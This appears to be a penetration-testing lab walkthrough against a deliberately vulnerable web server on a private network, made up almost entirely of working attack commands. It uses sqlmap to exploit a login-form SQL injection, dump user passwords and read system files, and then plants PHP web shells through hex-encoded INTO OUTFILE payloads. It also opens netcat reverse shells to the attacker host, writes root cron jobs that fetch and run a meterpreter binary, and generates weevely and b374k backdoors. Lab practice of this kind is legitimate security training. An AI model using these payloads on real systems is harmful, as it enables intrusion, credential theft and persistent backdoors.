
### Network Configuration
```
--------------------         ------------------
|                  |---------|     Attacker   |
|      Router      |         |  192.168.50.6  |
|                  |         ------------------
|                  |         ------------------
|   192.168.50.1   |---------|     Victim     |
|                  |         |  192.168.50.9  |
--------------------         ------------------
```
```
nmap -p 1-65535 -T4 -A -v 192.168.50.9
```
http://192.168.50.9/
```
Username: alex
Password: '
```
sqlmap POST request injection

Syntax
```
sqlmap -r target.request -p param

-r Load HTTP request from a file
-p Testable parameter(s)
```
```
sqlmap -r ~/kiop4.request -p mypassword

OR

POST /checklogin.php HTTP/1.1
myusername=alex&mypassword=alex&Submit=Login

sqlmap -u http://192.168.50.9/checklogin.php --data="myusername=alex&mypassword=alex&Submit=Login" -p mypassword
```

Flush session files for current target
```
sqlmap -u http://192.168.50.9 --flush-session
```

Detection:
```
    --level=LEVEL       Level of tests to perform (1-5, default 1)
    --risk=RISK         Risk of tests to perform (1-3, default 1)

sqlmap -r ~/kiop4.request -p mypassword --level=5 --risk=3
```
```
sqlmap -r ~/kiop4.request -p mypassword -v 0 --fingerprint --banner --current-db --current-user --is-dba

sqlmap -u http://192.168.50.9/checklogin.php --data="myusername=alex&mypassword=alex&Submit=Login" -p mypassword --v 0 --fingerprint --banner --current-db --current-user --is-dba
```
```
  -v VERBOSE      Verbosity level: 0-6 (default 1)

sqlmap -r ~/kiop4.request -p mypassword -v 0 --fingerprint --banner --current-db --current-user --is-dba
sqlmap -r ~/kiop4.request -p mypassword -v 1 --fingerprint --banner --current-db --current-user --is-dba
sqlmap -r ~/kiop4.request -p mypassword -v 3 --fingerprint --banner --current-db --current-user --is-dba
sqlmap -r ~/kiop4.request -p mypassword -v 6 --fingerprint --banner --current-db --current-user --is-dba

sqlmap -r ~/kiop4.request -v 0 --dbs
sqlmap -r ~/kiop4.request -v 0 -D members --tables
sqlmap -r ~/kiop4.request -v 0 -D members -T members --columns --count
sqlmap -r ~/kiop4.request -v 0 -D members -T members --dump

| 1  | john     | MyNameIsJohn          |
| 2  | robert   | ADGAdsafdfwt4gadfga== 

sqlmap -r ~/kiop4.request -v 0 --users --passwords
```
```
sqlmap -r ~/kiop4.request --file-read="/etc/passwd"

cat /root/.sqlmap/output/192.168.50.9/files/_etc_passwd
```
```
find / -name apache2.conf

/etc/apache2/apache2.conf

sqlmap -r ~/kiop4.request --file-read="/etc/apache2/apache2.conf"

sqlmap -r ~/kiop4.request --threads=8 --file-read="/etc/apache2/apache2.conf"

tail /root/.sqlmap/output/192.168.50.9/files/_etc_apache2_apache2.conf
```
```
sqlmap -r ~/kiop4.request --threads=8 --file-read="/etc/apache2/sites-enabled/000-default"

grep -i "DocumentRoot" /root/.sqlmap/output/192.168.50.9/files/_etc_apache2_sites-enabled_000-default

	DocumentRoot /var/www/
```
```
sqlmap -r ~/kiop4.request --threads=8 --file-read="/var/www/index.php"

cat /root/.sqlmap/output/192.168.50.9/files/_var_www_index.php
```
```
sqlmap -r ~/kiop4.request --threads=8 --file-read="/var/www/checklogin.php"

cat /root/.sqlmap/output/192.168.50.9/files/_var_www_checklogin.php
```

Context control:
```
  -B, --before-context=NUM  print NUM lines of leading context
  -A, --after-context=NUM   print NUM lines of trailing context

Pattern selection and interpretation:
  -i, --ignore-case         ignore case distinctions
*****************************************************************

cat /root/.sqlmap/output/192.168.50.9/files/_var_www_checklogin.php | grep -i pass -A 1 -B 1
```
```
   --sql-shell         Prompt for an interactive SQL shell

sqlmap -r ~/kiop4.request -v 0 --sql-shell

sql-shell> select * from members
```
```
   --os-shell          Prompt for an interactive operating system shell

sqlmap -r ~/kiop4.request -v 0 --os-shell

os-shell> id
os-shell> whereis nc

On Kali
# nc -lvp 443

os-shell> /bin/nc.traditional 192.168.50.6 443 -e /bin/sh

On Kali
id
ls
pwd
```
-------------------

Weevely - Weaponized web shell
```
weevely generate <password> <path>
weevely <URL> <password> [cmd]

weevely generate alex123 ~/backdoor.php
```
```
    --file-write=WFILE  Write a local file on the back-end DBMS file system
    --file-dest=DFILE   Back-end DBMS absolute filepath to write to

sqlmap -r ~/kiop4.request -v 0 --file-write=~/backdoor.php --file-dest=/var/www/backdoor.php

[ERROR] none of the SQL injection techniques detected can be used to write files to the underlying file system of the back-end MySQL server.
```

--------------------------

[INFO] trying to upload the file stager on '/var/www/' via LIMIT 'LINES TERMINATED BY' method

[PAYLOAD] 
```
-7674' OR 3149=3149 LIMIT 0,1 INTO OUTFILE '/var/www/tmpuwexm.php' LINES TERMINATED BY 0x3c3f7068700a69662028697373657428245f524551554553545b2275706c6f6164225d29297b246469723d245f524551554553545b2275706c6f6164446972225d3b6966202870687076657273696f6e28293c27342e312e3027297b2466696c653d24485454505f504f53545f46494c45535b2266696c65225d5b226e616d65225d3b406d6f76655f75706c6f616465645f66696c652824485454505f504f53545f46494c45535b2266696c65225d5b22746d705f6e616d65225d2c246469722e222f222e2466696c6529206f722064696528293b7d656c73657b2466696c653d245f46494c45535b2266696c65225d5b226e616d65225d3b406d6f76655f75706c6f616465645f66696c6528245f46494c45535b2266696c65225d5b22746d705f6e616d65225d2c246469722e222f222e2466696c6529206f722064696528293b7d4063686d6f6428246469722e222f222e2466696c652c30373535293b6563686f202246696c652075706c6f61646564223b7d656c7365207b6563686f20223c666f726d20616374696f6e3d222e245f5345525645525b225048505f53454c46225d2e22206d6574686f643d504f535420656e63747970653d6d756c7469706172742f666f726d2d646174613e3c696e70757420747970653d68696464656e206e616d653d4d41585f46494c455f53495a452076616c75653d313030303030303030303e3c623e73716c6d61702066696c652075706c6f616465723c2f623e3c62723e3c696e707574206e616d653d66696c6520747970653d66696c653e3c62723e746f206469726563746f72793a203c696e70757420747970653d74657874206e616d653d75706c6f61644469722076616c75653d2f7661722f7777772f3e203c696e70757420747970653d7375626d6974206e616d653d75706c6f61642076616c75653d75706c6f61643e3c2f666f726d3e223b7d3f3e0a-- #
```

[TRAFFIC OUT] HTTP request
```
myusername=alex&mypassword=-7674%27%20OR%203149%3D3149%20LIMIT%200%2C1%20INTO%20OUTFILE%20%27%2Fvar%2Fwww%2Ftmpuwexm.php%27%20LINES%20TERMINATED%20BY%200x3c3f7068700a69662028697373657428245f524551554553545b2275706c6f6164225d29297b246469723d245f524551554553545b2275706c6f6164446972225d3b6966202870687076657273696f6e28293c27342e312e3027297b2466696c653d24485454505f504f53545f46494c45535b2266696c65225d5b226e616d65225d3b406d6f76655f75706c6f616465645f66696c652824485454505f504f53545f46494c45535b2266696c65225d5b22746d705f6e616d65225d2c246469722e222f222e2466696c6529206f722064696528293b7d656c73657b2466696c653d245f46494c45535b2266696c65225d5b226e616d65225d3b406d6f76655f75706c6f616465645f66696c6528245f46494c45535b2266696c65225d5b22746d705f6e616d65225d2c246469722e222f222e2466696c6529206f722064696528293b7d4063686d6f6428246469722e222f222e2466696c652c30373535293b6563686f202246696c652075706c6f61646564223b7d656c7365207b6563686f20223c666f726d20616374696f6e3d222e245f5345525645525b225048505f53454c46225d2e22206d6574686f643d504f535420656e63747970653d6d756c7469706172742f666f726d2d646174613e3c696e70757420747970653d68696464656e206e616d653d4d41585f46494c455f53495a452076616c75653d313030303030303030303e3c623e73716c6d61702066696c652075706c6f616465723c2f623e3c62723e3c696e707574206e616d653d66696c6520747970653d66696c653e3c62723e746f206469726563746f72793a203c696e70757420747970653d74657874206e616d653d75706c6f61644469722076616c75653d2f7661722f7777772f3e203c696e70757420747970653d7375626d6974206e616d653d75706c6f61642076616c75653d75706c6f61643e3c2f666f726d3e223b7d3f3e0a--%20%23&Submit=Login
```

**The HTTP request (encoded) includes 2 parts:**

1. Decoded as URL
```
myusername=alex&mypassword=-7674' OR 3149=3149 LIMIT 0,1 INTO OUTFILE '/var/www/tmpuwexm.php' LINES TERMINATED BY 0x<HEX>-- #&Submit=Login
```
2. Decoded as ASCII Hex
```
<?php
if (isset($_REQUEST["upload"])){$dir=$_REQUEST["uploadDir"];if (phpversion()<'4.1.0'){$file=$HTTP_POST_FILES["file"]["name"];@move_uploaded_file($HTTP_POST_FILES["file"]["tmp_name"],$dir."/".$file) or die();}else{$file=$_FILES["file"]["name"];@move_uploaded_file($_FILES["file"]["tmp_name"],$dir."/".$file) or die();}@chmod($dir."/".$file,0755);echo "File uploaded";}else {echo "<form action=".$_SERVER["PHP_SELF"]." method=POST enctype=multipart/form-data><input type=hidden name=MAX_FILE_SIZE value=1000000000><b>sqlmap file uploader</b><br><input name=file type=file><br>to directory: <input type=text name=uploadDir value=/var/www/> <input type=submit name=upload value=upload></form>";}?>
```

**PUT YOUR OWN BACKDOOR**

1. Examine the [PAYLOAD] from sqlmap
```
-7674' OR 3149=3149 LIMIT 0,1 INTO OUTFILE '/var/www/backdoor.php' LINES TERMINATED BY 0x3c3f7068700a69662028697373657428245f524551554553545b2275706c6f6164225d29297b246469723d245f524551554553545b2275706c6f6164446972225d3b6966202870687076657273696f6e28293c27342e312e3027297b2466696c653d24485454505f504f53545f46494c45535b2266696c65225d5b226e616d65225d3b406d6f76655f75706c6f616465645f66696c652824485454505f504f53545f46494c45535b2266696c65225d5b22746d705f6e616d65225d2c246469722e222f222e2466696c6529206f722064696528293b7d656c73657b2466696c653d245f46494c45535b2266696c65225d5b226e616d65225d3b406d6f76655f75706c6f616465645f66696c6528245f46494c45535b2266696c65225d5b22746d705f6e616d65225d2c246469722e222f222e2466696c6529206f722064696528293b7d4063686d6f6428246469722e222f222e2466696c652c30373535293b6563686f202246696c652075706c6f61646564223b7d656c7365207b6563686f20223c666f726d20616374696f6e3d222e245f5345525645525b225048505f53454c46225d2e22206d6574686f643d504f535420656e63747970653d6d756c7469706172742f666f726d2d646174613e3c696e70757420747970653d68696464656e206e616d653d4d41585f46494c455f53495a452076616c75653d313030303030303030303e3c623e73716c6d61702066696c652075706c6f616465723c2f623e3c62723e3c696e707574206e616d653d66696c6520747970653d66696c653e3c62723e746f206469726563746f72793a203c696e70757420747970653d74657874206e616d653d75706c6f61644469722076616c75653d2f7661722f7777772f3e203c696e70757420747970653d7375626d6974206e616d653d75706c6f61642076616c75653d75706c6f61643e3c2f666f726d3e223b7d3f3e0a-- #
```
This payload can be written as follows:
```
-7674' OR 3149=3149 LIMIT 0,1 INTO OUTFILE '/var/www/backdoor.php' LINES TERMINATED BY 0x<HEX>-- #
```
```
https://www.urlencoder.org/
https://meyerweb.com/eric/tools/dencoder/
http://www.convertstring.com/EncodeDecode/UrlEncode
```
The 1st part is:
```
-7674' OR 3149=3149 LIMIT 0,1 INTO OUTFILE '/var/www/backdoor.php' LINES TERMINATED BY 0x
```
Encode as URL
```
-7674%27%20OR%203149%3D3149%20LIMIT%200%2C1%20INTO%20OUTFILE%20%27%2Fvar%2Fwww%2Fbackdoor.php%27%20LINES%20TERMINATED%20BY%200x
```

The 2nd part is:
```
-- #
```
Encode as URL
```
--%20%23
```

So the payload should be:
```
-7674%27%20OR%203149%3D3149%20LIMIT%200%2C1%20INTO%20OUTFILE%20%27%2Fvar%2Fwww%2Fbackdoor.php%27%20LINES%20TERMINATED%20BY%200x<HEX>--%20%23
```

Next is the <HEX> part

PHP Shell
```
b374k shell 3.2
https://github.com/b374k/b374k
https://github.com/b374k/b374k/releases

cp ~/Downloads/b374k-3.2.3.zip ~
unzip b374k-3.2.3.zip
cd b374k-3.2.3/
```
```
For help
php -f index.php --

For list available modules
php -f index.php -- -l

Create backdoor...

php -f index.php -- -o alex.php -p alex123 -m database,info,processes -s -b -z gzcompress -c 9
```

Encode as ASCII Hex
```
<ABCD>
```

So the final payload using b374k shell would be
```
-7674%27%20OR%203149%3D3149%20LIMIT%200%2C1%20INTO%20OUTFILE%20%27%2Fvar%2Fwww%2Fbackdoor.php%27%20LINES%20TERMINATED%20BY%200x<ABCD>--%20%23
```

The original HTTP request is
```
myusername=alex&mypassword=alex&Submit=Login
```
The modified HTTP request is
```
myusername=alex&mypassword=<PAYLOAD>&Submit=Login

myusername=alex&mypassword=-7674%27%20OR%203149%3D3149%20LIMIT%200%2C1%20INTO%20OUTFILE%20%27%2Fvar%2Fwww%2Fbackdoor.php%27%20LINES%20TERMINATED%20BY%200x<ABCD>--%20%23&Submit=Login
```
---------------------
#### SQL Injection
```
os-shell> cat checklogin.php

$myusername = stripslashes($myusername);
//$mypassword = stripslashes($mypassword);
$myusername = mysql_real_escape_string($myusername);
//$mypassword = mysql_real_escape_string($mypassword);

$result=mysql_query("SELECT * FROM $tbl_name WHERE username='$myusername' and password='$mypassword'");
```
```
' OR 1=1 INTO OUTFILE '/var/www/test' -- #

Web browser => http://192.168.50.9/test

OR

curl http://192.168.50.9/test
```
```
<?php passthru($_GET['cmd']); ?>
```
Encode as ASCII Hex
```
3c3f70687020706173737468727528245f4745545b27636d64275d293b203f3e
```
Add the '0x'
```
0x3c3f70687020706173737468727528245f4745545b27636d64275d293b203f3e
```
```
' AND 1=1 union select 0x20,0x20,0x20 INTO OUTFILE '/var/www/xxx.php' LINES TERMINATED BY 0x3c3f70687020706173737468727528245f4745545b27636d64275d293b203f3e -- #

http://192.168.50.9/xxx.php?cmd=uname

Linux
```
```
' OR 1=1 union select 0x20,0x20,0x20 INTO OUTFILE '/var/www/xxx1.php' LINES TERMINATED BY 0x3c3f70687020706173737468727528245f4745545b27636d64275d293b203f3e -- #

http://192.168.50.9/xxx1.php?cmd=uname

1 john MyNameIsJohnLinux 
2 robert ADGAdsafdfwt4gadfga==Linux 
Linux 
```
```
' OR 1=1 union select 0x616c6578,0x616c6578,0x616c6578 INTO OUTFILE '/var/www/xxx2.php' LINES TERMINATED BY 0x3c3f70687020706173737468727528245f4745545b27636d64275d293b203f3e -- #

1 john MyNameIsJohnLinux 
2 robert ADGAdsafdfwt4gadfga==Linux 
alex alex alexLinux 
```
```
' OR 1 union select 1,2,3 INTO OUTFILE '/var/www/xxx3.php' LINES TERMINATED BY 0x3c3f70687020706173737468727528245f4745545b27636d64275d293b203f3e -- #

1 john MyNameIsJohnLinux 
2 robert ADGAdsafdfwt4gadfga==Linux 
1 2 3Linux 
```
```
' AND 1 union select 1,2,3 INTO OUTFILE '/var/www/xxx4.php' LINES TERMINATED BY 0x3c3f70687020706173737468727528245f4745545b27636d64275d293b203f3e -- #

1 2 3Linux 
```
```
' OR 1 INTO OUTFILE '/var/www/xxx5.php' LINES TERMINATED BY 0x3c3f70687020706173737468727528245f4745545b27636d64275d293b203f3e -- #

1 john MyNameIsJohnLinux 
2 robert ADGAdsafdfwt4gadfga==Linux 
```
```
' AND 1 INTO OUTFILE '/var/www/xxx6.php' LINES TERMINATED BY 0x3c3f70687020706173737468727528245f4745545b27636d64275d293b203f3e -- #

NOTHING OUPUT 
```
```
' OR 1 LIMIT 0,1 INTO OUTFILE '/var/www/xxx7.php' LINES TERMINATED BY 0x3c3f70687020706173737468727528245f4745545b27636d64275d293b203f3e -- #

1 john MyNameIsJohnLinux 
```
```
' AND 1 LIMIT 0,1 INTO OUTFILE '/var/www/xxx8.php' LINES TERMINATED BY 0x3c3f70687020706173737468727528245f4745545b27636d64275d293b203f3e -- #

NOTHING OUPUT 
```
```
' union select 1,2,3 INTO OUTFILE '/var/www/xxx9.php' LINES TERMINATED BY 0x3c3f70687020706173737468727528245f4745545b27636d64275d293b203f3e -- #

1 2 3Linux 
```
```
' union select 0x20,0x20,0x20 INTO OUTFILE '/var/www/xxx10.php' LINES TERMINATED BY 0x3c3f70687020706173737468727528245f4745545b27636d64275d293b203f3e -- #

Linux
```
```

' LIMIT 0,1 INTO OUTFILE '/var/www/xxx11.php' LINES TERMINATED BY 0x3c3f70687020706173737468727528245f4745545b27636d64275d293b203f3e -- #

NOTHING OUPUT 
```
```
* * * * * root /bin/nc.traditional 192.168.50.6 443 -e /bin/sh

Encode as ASCII Hex

2a202a202a202a202a20726f6f74202f62696e2f6e632e747261646974696f6e616c203139322e3136382e35302e3620343433202d65202f62696e2f7368

Add the '0x'

0x2a202a202a202a202a20726f6f74202f62696e2f6e632e747261646974696f6e616c203139322e3136382e35302e3620343433202d65202f62696e2f7368

' AND 1=1 union select 0x20,0x20,0x20 INTO OUTFILE '/etc/cron.d/bd1' LINES TERMINATED BY 0x2a202a202a202a202a20726f6f74202f62696e2f6e632e747261646974696f6e616c203139322e3136382e35302e3620343433202d65202f62696e2f7368 -- #
```
On Kali
```
nc -lvp 443
```
=> FAILED

```

* * * * * root /bin/nc.traditional 192.168.50.6 443 -e /bin/sh

=> DO NOT forget 'new line' at the end!

Encode as ASCII Hex

2a202a202a202a202a20726f6f74202f62696e2f6e632e747261646974696f6e616c203139322e3136382e35302e3620343433202d65202f62696e2f73680a

=> '0a' = 'new line'

Add the '0x'

0x2a202a202a202a202a20726f6f74202f62696e2f6e632e747261646974696f6e616c203139322e3136382e35302e3620343433202d65202f62696e2f73680a

' AND 1=1 union select 0x20,0x20,0x20 INTO OUTFILE '/etc/cron.d/bd2' LINES TERMINATED BY 0x2a202a202a202a202a20726f6f74202f62696e2f6e632e747261646974696f6e616c203139322e3136382e35302e3620343433202d65202f62696e2f73680a -- #
```
On Kali
```
nc -lvp 443
```
=> SUCCEEDED

```
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.50.6 LPORT=445 -f elf > backdoor.elf

file backdoor.elf

python -m SimpleHTTPServer &
```
```
* * * * * root rm /etc/cron.d/exploit; cd /tmp && wget 192.168.50.6:8000/backdoor.elf && chmod +x backdoor.elf && ./backdoor.elf; rm /tmp/backdoor.elf
```
=> DO NOT forget 'new line' at the end!
```
2a202a202a202a202a20726f6f7420726d202f6574632f63726f6e2e642f6578706c6f69743b206364202f746d702026262077676574203139322e3136382e35302e363a383030302f6261636b646f6f722e656c662026262063686d6f64202b78206261636b646f6f722e656c66202626202e2f6261636b646f6f722e656c663b20726d202f746d702f6261636b646f6f722e656c660a

0x2a202a202a202a202a20726f6f7420726d202f6574632f63726f6e2e642f6578706c6f69743b206364202f746d702026262077676574203139322e3136382e35302e363a383030302f6261636b646f6f722e656c662026262063686d6f64202b78206261636b646f6f722e656c66202626202e2f6261636b646f6f722e656c663b20726d202f746d702f6261636b646f6f722e656c660a
```
=> REMEMBER to edit OUTFILE name to 'exploit'
```
' AND 1=1 union select 0x20,0x20,0x20 INTO OUTFILE '/etc/cron.d/exploit' LINES TERMINATED BY 0x2a202a202a202a202a20726f6f7420726d202f6574632f63726f6e2e642f6578706c6f69743b206364202f746d702026262077676574203139322e3136382e35302e363a383030302f6261636b646f6f722e656c662026262063686d6f64202b78206261636b646f6f722e656c66202626202e2f6261636b646f6f722e656c663b20726d202f746d702f6261636b646f6f722e656c660a -- #
```
On Kali
```
msfconsole -x "use multi/handler; set PAYLOAD linux/x86/meterpreter/reverse_tcp; set LHOST 192.168.50.6; set LPORT 445; run"
```

